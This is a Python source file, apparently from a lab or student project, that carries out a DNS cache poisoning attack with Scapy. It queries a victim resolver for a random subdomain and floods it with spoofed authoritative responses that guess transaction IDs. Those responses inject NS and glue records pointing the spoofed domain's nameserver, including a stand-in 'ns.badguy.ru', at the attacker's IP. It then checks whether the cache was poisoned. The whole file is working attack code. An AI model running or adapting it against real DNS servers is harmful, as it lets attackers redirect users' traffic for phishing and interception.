## @package DNS_Poisoning
#
#   This package includes all function to execute the poisoning attack


from scapy import *
from scapy.all import *
import scapy.layers.l2
import time
from multiprocessing.pool import ThreadPool
import logging
import threading
import multiprocessing
import signal

## DNSPoisoning
#
#   This class is responsible for the dns poisoning attack
#
class DNSPoisoning:

    ##  Constructor
    #
    #   @param victim_server The IP of the server to attack
    #   @param attacker_ip The IP of the attacker
    #
    def __init__(self, victim_server, spoofed_domain, attacker_ip, authoritative_nameserver,\
         initial_id, interrupt_handler=None, blessing_terminal=None, log=lambda msg: None):
        self.victim_server = victim_server
        self.spoofed_domain = spoofed_domain
        self.attacker_ip = attacker_ip
        self.id = initial_id
        self.sport = 53
        self.flood_socket = None
        self.auth_nameserver = authoritative_nameserver
        self.flood_pool = None

        self.log = log
        self.t = blessing_terminal
        #Handler of CTRL+C
        self.interrupt_handler = interrupt_handler

        self.invalid_url = 'x' + str(random.randint(10,1000)) + 'x.' + self.spoofed_domain

        log("Invalid URL used: " + self.invalid_url)


    ##  Send crafted packet
    #
    #   @brief This function bla bla bla bla aaaaaa
    #   @param id_req The TXID to be used
    #   1) responses should come from the same dest port (53)
    #   2) Question should match the query section
    #   3) Query ID should match
    #
    # Use Default DNS port as default source port    
    #
    # DNS Request:  
    #   -) ID
    #   -) Question
    #   -) 
    #
    #

    def send_crafted_packet(self, id_req):
        ##!@brief Send Crafted Packet

        
        #print("Using ID: " + str(id_req), end='') 
            
        #First type of attack
        #qr = Response Flag
        #rd = Recursion Desidered
        #ra = 
        #aa = Authoritative response
        #nscount = number of NS 
        #arcount = number of authoritative response
        #qdcount = number of question
        #ancount = number of answer

        #TODO: check recursion available
        crafted_response_1 = IP(dst=self.victim_server, src=self.auth_nameserver)\
            /UDP(dport=53, sport=53)\
                /DNS(id=id_req,\
                    qr=1,\
                    #rd=1,\
                    ra=1,\
                    aa=1,\
                    #nscount=1,\
                    #arcount=1,\
                    #ancount=1,\
                    #qdcount=1,\
                    qd=DNSQR(qname=self.invalid_url, qtype="A", qclass='IN'),\
                    #an=DNSRR(rrname=self.invalid_url, type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
                    ar=DNSRR(rrname='ns.' + self.spoofed_domain, type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
                    ns=DNSRR(rrname=self.spoofed_domain, type='NS', rclass='IN', ttl=70000, rdata='ns.' + self.spoofed_domain + '.')\
                )

        #Second type of attack
        crafted_response_2 = IP(dst=self.victim_server, src=self.auth_nameserver)\
            /UDP(dport=53, sport=53)\
                /DNS(id=id_req,\
                    qr=1,\
                    aa=1,\
                    ra=0,\
                    rd=0,\
                    nscount=1,\
                    arcount=1,\
                    ancount=0,\
                    qdcount=1,\
                    qd=DNSQR(qname=self.invalid_url, qtype="A"),\
                    an=None,\
                    ns=DNSRR(rrname=self.invalid_url ,type='NS', rclass=1, ttl=70000, rdata="ns.badguy.ru"),\
                    ar=(DNSRR(rrname='ns.badguy.ru', type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip))
                )

        self.flood_socket.send(crafted_response_1)

    def send_inital_query(self):
        #self.sport = random.randint(1024, 65536)

        logging.info("Used ID %d", self.id)

        query = IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(rd=1,qd=DNSQR(qname=self.invalid_url))

        send(query)


    def start_flooding(self):

        number_of_guess = 500

        spacing = 800

        #Craft the packet

        #TODO: check max int
        id_range = range(self.id + spacing,self.id + spacing + number_of_guess)

        self.log("\nUsing ID from {t.bold}{t.blue}{initial}{t.normal} to {t.bold}{t.blue}{final}{t.normal}\n".format(initial=self.id + spacing, final=self.id + spacing + number_of_guess, t=self.t))

        #Taken from that: https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html 
        self.log("Opening socket for faster flood...")
        self.flood_socket = conf.L3socket(iface='vboxnet0') #TODO: Put this in the parameter

        self.flood_pool = ThreadPool(number_of_guess)

        result = self.flood_pool.map(self.send_crafted_packet, id_range)
        self.flood_pool.close()

        self.flood_pool.join()
        self.flood_socket.close()
        self.log("Flood finished")



    def check_poisoning(self):
        # check to see if it worked
        # ask the victim for the IP of the domain we are trying to spoof
        try:
            pkt = sr1(IP(dst=self.victim_server) / UDP(sport=53, dport=53) / DNS(qr=0, qd=DNSQR(qname=self.spoofed_domain, qtype='A')), verbose=True, iface='vboxnet0', timeout=10)
            self.log("Answer arrived")
            if pkt[DNS].an and pkt[DNS].an.rdata:
                actualAnswer = str(pkt[DNS].an.rdata)
                # if the IP is our IP, we poisoned the victim
                if actualAnswer == self.attacker_ip:
                    return True
            return False
        except:
            return False


    def stop_handler(self, sig, frame):
        self.log("Closing socket")
        self.flood_socket.close()
        self.flood_pool.terminate()
        self.log("Cache poisoning stopped")

        if self.interrupt_handler  != None:     #If an interrupt handler is passed
            signal.signal(signal.SIGINT, self.interrupt_handler)    #Set it as a new SIGINT handler
